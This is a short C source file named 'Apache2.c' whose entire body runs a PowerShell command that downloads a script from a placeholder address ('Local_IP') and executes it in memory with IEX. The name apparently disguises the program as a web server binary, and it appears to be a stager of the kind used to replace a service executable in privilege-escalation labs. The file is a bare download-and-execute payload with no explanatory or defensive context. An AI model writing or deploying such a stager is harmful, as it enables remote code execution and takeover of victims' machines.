/* Apache2.c */
#include<stdio.h>
main()
{
system("powershell.exe \"IEX ((new-object net.webclient).downloadstring('http://Local_IP/powershellfile.txt '))\"");
return 0;
}
